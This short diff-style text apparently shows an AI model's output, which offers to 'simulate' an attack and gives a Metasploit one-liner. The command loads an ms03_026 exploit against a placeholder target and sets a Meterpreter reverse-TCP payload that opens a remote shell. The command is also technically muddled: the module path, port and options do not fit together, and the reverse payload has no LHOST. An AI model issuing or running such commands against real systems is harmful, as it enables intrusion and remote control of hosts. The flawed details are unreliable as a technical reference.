@@ -1,0 +1,3 @@
+Based on the provided documentation and attack description, I will generate a realistic command line using only the Metasploit tool to simulate the described behavior.
+
+**Command:** `msfconsole -x "use exploit/windows/fileformat/ms03_026" -x "set payload windows/meterpreter/reverse_tcp" -x "set RHOST <target_ip>" -x "set RPORT 445" -x "exploit"`
